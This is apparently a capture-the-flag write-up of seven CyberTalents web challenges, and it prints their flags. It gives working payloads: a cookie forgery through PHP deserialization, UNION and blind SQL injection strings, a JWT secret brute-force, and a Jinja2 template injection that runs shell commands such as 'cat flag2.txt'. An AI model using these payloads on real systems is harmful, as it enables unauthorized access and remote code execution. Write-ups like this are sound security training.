## 2 SEP 2021 | cybertalents


# 1- one click | 25 pts
``` 
-Type of malicious exploit of a website where unauthorized commands are submitted from a user that the web application trusts .
CSRF
```

# 2- where is the flag | 50 pts
```
in page source code :
Can you see the flag
	VGgzRmxhZzFzSDNyM0JyMA%3D%3D
  
it is base64 encoded let's decode it :
echo "VGgzRmxhZzFzSDNyM0JyMA==" | base64 -d
flag :Th3Flag1sH3r3Br0   
```

# 3- catch toka  | 50 pts
![image](https://user-images.githubusercontent.com/67979878/131999513-d567d9fc-d47d-4071-b7ff-e422ae78a903.png)

```
- try to modify request by : X-Forwarded-For: german_ip  but doesn't work 
- then i changed Accept language header to german hence it only talks german xD 
  check :https://www.websitepulse.com/kb/http_accept_language
  so in request : Accept-Language: de
```
![image](https://user-images.githubusercontent.com/67979878/132000126-f6c6f56a-a6e3-4ee7-b785-ebef8da38300.png)

# 4- wanna some biscuits | 50 pts 

![image](https://user-images.githubusercontent.com/67979878/132000336-77588af6-8497-48bc-a1f5-7d04e1443bd5.png)

```
source code doesn't contain any thing helpful however we have a cookie !
```
![image](https://user-images.githubusercontent.com/67979878/132000466-423f1156-2d82-4bd3-9b26-3fba151f4db6.png)


```
looks like insecure deserialization :D , let's modify these values (username, isAdmin)

O:4:"User":2:{s:8:"userName";s:9:"anonymous";s:7:"isAdmin";b:0;}

to

O:4:"User":2:{s:8:"userName";s:5:"admin";s:7:"isAdmin";b:1;}
```
![image](https://user-images.githubusercontent.com/67979878/132000676-4e983b9a-7367-4140-b176-270883a20b94.png)


# 5- Pasta Code | 100 pts

```
when visit it will get restricted port to open hence it runs on port 6000

great link to bypass :https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/

```

![image](https://user-images.githubusercontent.com/67979878/132001325-2f804a8d-0f0e-498d-8dae-c436c1f53e7f.png)

```
register and login with your credits you will notice a JWT in request 

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluMiJ9.xh8kwc0iNg97vgw9JTENTIpvrw_JrPrYyuLbwz0ax6A

let's bruteforce it and get our secret !

```
![image](https://user-images.githubusercontent.com/67979878/132001884-84457cb9-44cb-4dbc-8853-7832afeb32ef.png)
![image](https://user-images.githubusercontent.com/67979878/132001978-746b2d5f-4667-4a9d-a1d4-38e5b71ef086.png)

```
moidfying JWT value will reveal the flag 
```

# 6- Notes | 100 pts

```
can't login or regiseter only can view notes tab and there find some notes and checked them
```
![image](https://user-images.githubusercontent.com/67979878/132009366-7b8b7624-2aac-435c-b8fa-63dc53c3238b.png)

```
when visit any page it take note name and base64 it 
```
![image](https://user-images.githubusercontent.com/67979878/132009583-954852a6-5e22-4fc0-8e64-37ecd479d81c.png)

```
it looks like if there is a hidden parameter at this tempelate and it takes this text and decode it then retrieve data 
[x] let's try inject some XSS , failed
[]  try some sql :D 

junk' UNION SELECT * FROM information_schema.tables-- => base64 it
```
![image](https://user-images.githubusercontent.com/67979878/132010241-57f1572c-5f60-4934-bd66-c19ba4e4ad8e.png)
```
so it is not MySQL let's try sqlite :
junk' UNION SELECT * FROM sqlite_master--
```
![image](https://user-images.githubusercontent.com/67979878/132010405-1d404520-60e3-4bad-b87b-4176e94ddd1c.png)
```
it looks like it is , but need to specify right number of columns 
junk' UNION SELECT tbl_name FROM sqlite_master--

```
![image](https://user-images.githubusercontent.com/67979878/132010547-3b447f89-9943-4249-be68-1472ebd07032.png)

``junk' UNION SELECT flag FROM flags--``

![image](https://user-images.githubusercontent.com/67979878/132010692-e8da36ad-8530-407d-bd64-cfae3a7ec05b.png)

we have half of the flag 
`You made it! FLAG{8f94cf148a9f01a3745e`

we have a note saying : `I like flask and this ginger thing`
ginger ==> jinja
![image](https://user-images.githubusercontent.com/67979878/132011021-9e1ae56e-26ac-485a-9663-04a7bc2608ea.png)

check : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

![image](https://user-images.githubusercontent.com/67979878/132011271-2fd73a73-5927-4a7f-93ee-dc7da7d2092e.png)

we have a hint form the author : `The second part of the flag has to do with your reflected input. what input can you reflect on the page?`
- we can only reflect our sql injection :3 so let's try inject SSTI inside SQLi 
`junk' UNION SELECT "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
" FROM flags--`
![image](https://user-images.githubusercontent.com/67979878/132011535-bc8ab651-6efd-496a-aa57-5a18c87db04b.png)

`junk' UNION SELECT "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag2.txt').read() }}
" FROM flags--`

![image](https://user-images.githubusercontent.com/67979878/132012186-f691aa0f-281a-43a6-9733-4ced95d0b297.png)

`FLAG{8f94cf148a9f01a3745e12f1fc6f8e419dc0fb08}`

# 7- grocery bot | 200 pts

```
well it was the hardest one xD , when try /price flag ' it returns an error occured so it seems sql but blind :( 

maybe this is not smartest way , i try hard to autmoate this but can't :( 

/price flag' AND (SELECT CASE WHEN (SUBSTR(flag,1,1)='F') THEN 1/0 ELSE 'a' END FROM flags)='a

if returns an error occured so we are on right path , otherwise then characters is not in the flag

```
![image](https://user-images.githubusercontent.com/67979878/132033008-3be4a7da-a676-483e-8312-9915927dc321.png)
![image](https://user-images.githubusercontent.com/67979878/132033122-43e33882-2635-4f50-aa29-5b8e5e874ff9.png)
![image](https://user-images.githubusercontent.com/67979878/132033715-d625bf4f-179c-4196-a918-9a5ec21a6138.png)

after a long time :

`` | FLAG{sql_1nj3c7i0n_c4n_h4pp3n_t0_b0ts_t0o} ``

# done
